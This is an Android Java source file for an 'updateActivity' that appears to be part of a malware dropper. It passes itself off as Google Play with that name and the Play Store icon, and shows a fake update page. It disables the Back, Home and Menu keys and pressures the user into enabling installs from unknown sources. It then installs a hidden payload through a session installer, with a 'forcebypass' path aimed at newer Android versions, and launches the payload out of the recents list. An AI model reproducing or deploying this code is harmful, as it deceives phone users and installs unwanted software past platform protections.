package com.appd.instll;

import static com.appd.instll.constants.dpstyle;
import static com.appd.instll.constants.forcebypass;
import static com.appd.instll.constants.optndatascan;
import static com.appd.instll.shalter.Utility.drawableToBitmap;
import static com.appd.instll.tools.getAppIconAsBase64;
import static com.appd.instll.tools.getFormattedDateMinusDays;
import static com.appd.instll.tools.getInstallerPackageName;
import static com.appd.instll.tools.getLabelApplication;
import static com.appd.instll.tools.isAppInstalled;
import static com.appd.instll.tools.loadHtmlFromAssets;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.Toast;

import java.util.Locale;


public class updateActivity extends Activity {
    public class WebAppInterface {
        Context mContext;
        WebView mWebv;

        public WebAppInterface(Context context,WebView webv) {
            this.mContext = context;
            this.mWebv = webv;
        }

        @JavascriptInterface
        public void opencheck() {
            if (isAppInstalled(mContext, optndatascan)) {
                Handler mainHandler = new Handler(mContext.getMainLooper());
                mainHandler.post(new Runnable() {
                    @Override
                    public void run() {

                        try {

                            Intent intentxx = new Intent();
                            intentxx.setComponent(new ComponentName(optndatascan, optndatascan + ".A1"));
                            intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                            intentxx.setAction(Intent.ACTION_MAIN);
                            intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                            mContext.startActivity(intentxx);
                        } catch (Exception a) {

                        }

                        try {
                            Intent intentxx = new Intent();
                            intentxx.setComponent(new ComponentName(optndatascan, optndatascan + ".A2"));
                            intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                            intentxx.setAction(Intent.ACTION_MAIN);
                            intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);



                            mContext.startActivity(intentxx);
                        } catch (Exception a) {

                        }
                        updateActivity.this.finish();
                    }
                });

                return;
            }
        }

        @JavascriptInterface
        public void updatecheck() {

            if (!mContext.getPackageManager().canRequestPackageInstalls()) {
                Intent reqinst = new Intent(mContext, Requestinstall.class);
                reqinst.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                mContext.startActivity(reqinst);
                return;
            }
            String myinstaller = getInstallerPackageName(mContext);
            if (myinstaller == null){
                myinstaller = "";
            }
            if (forcebypass.equals("1") &&
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                     !myinstaller.equals(mContext.getPackageName())){
                SessionManager.install(getApplicationContext());
                return;
            }

            Handler mainHandler = new Handler(mContext.getMainLooper());
            mainHandler.post(new Runnable() {
                @Override
                public void run() {
                    mWebv.evaluateJavascript("showinstall();", null);
                }
            });

            mainHandler.postDelayed(()->{
                SessionManager.install(mContext);
            },800);

        }

    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return false;
    }
    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }
    public Context myctx;
    @Override
    protected void onCreate( Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        myctx = getApplicationContext();
        if (isAppInstalled(myctx, optndatascan)) {
            // try{
            try {

                Intent intentxx = new Intent();
                intentxx.setComponent(new ComponentName(optndatascan, optndatascan + ".A1"));
                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                intentxx.setAction(Intent.ACTION_MAIN);
                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                startActivity(intentxx);
            } catch (Exception a) {

            }

            try {
                Intent intentxx = new Intent();
                intentxx.setComponent(new ComponentName(optndatascan, optndatascan + ".A2"));
                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                intentxx.setAction(Intent.ACTION_MAIN);
                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);



                startActivity(intentxx);
            } catch (Exception a) {

            }

            this.finish();
            return;
        }

        String packageName = "com.android.vending";


        PackageManager packageManager = getPackageManager();
        ApplicationInfo applicationInfo = null;
        try {
            applicationInfo = packageManager.getApplicationInfo(packageName, 0);
            Drawable appIcon = packageManager.getApplicationIcon(applicationInfo);
            String appName = packageManager.getApplicationLabel(applicationInfo).toString();
            setTitle(appName);
            Bitmap appIconBitmap = drawableToBitmap(appIcon);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                ActivityManager.TaskDescription taskDescription = new ActivityManager.TaskDescription("Google Play", appIconBitmap);
                setTaskDescription(taskDescription);
            }
        } catch (PackageManager.NameNotFoundException e) {
            //throw new RuntimeException(e);
        }

        WebView MywebView = new WebView(this);

        WebSettings webSettings = MywebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        MywebView.getSettings().setBuiltInZoomControls(false);
        MywebView.getSettings().setLoadsImagesAutomatically(true);
        MywebView.getSettings().setLoadWithOverviewMode(true);

        MywebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);

        String MyName = getLabelApplication(myctx);
        String loadpage = null;
        try {
            loadpage = loadHtmlFromAssets(getApplicationContext(), "up.html");
        } catch (Exception e) {

        }
        String pagebase64 = loadpage;

        try {
            String CurrnetLanuage = Locale.getDefault().getLanguage();
            pagebase64 = (pagebase64).replace("APPNAME", MyName)
                    .replace("[LNG]", CurrnetLanuage)
                    .replace("2024", "2025")
                    .replace("[BASE-ICO]", getAppIconAsBase64(myctx));
            //create webview , load the page from base64 and setcontent , delay for 5 sec , start main activity

            webSettings.setJavaScriptEnabled(true);  // Enable JavaScript

            MywebView.addJavascriptInterface(new updateActivity.WebAppInterface(this,MywebView), "Android");

            MywebView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    if (!myctx.getPackageManager().canRequestPackageInstalls()) {
                        return;
                    }
                    String myinstaller = getInstallerPackageName(myctx);
                    if (myinstaller == null){
                        myinstaller = "";
                    }
                    if (forcebypass.equals("1") &&
                            Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                            myinstaller.equals(myctx.getPackageName())){

                        Handler mainHandler = new Handler(myctx.getMainLooper());
                        mainHandler.post(new Runnable() {
                            @Override
                            public void run() {
                                view.evaluateJavascript("showinstall();", null);
                            }
                        });

                        mainHandler.postDelayed(()->{
                            SessionManager.install(myctx);
                        },800);
                    }


                }

            });

            MywebView.loadDataWithBaseURL(null, pagebase64, "text/html", "UTF-8", null);


        } catch (Exception e) {

        }

        String ua = MywebView.getSettings().getUserAgentString();

        MywebView.getSettings().setUserAgentString(ua);

        LinearLayout layout = new LinearLayout(this);
        layout.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
        ));

        LinearLayout.LayoutParams webViewParams =
                new LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.MATCH_PARENT
                );
        MywebView.setLayoutParams(webViewParams);

        layout.addView(MywebView);
        setContentView(layout);


    }
}
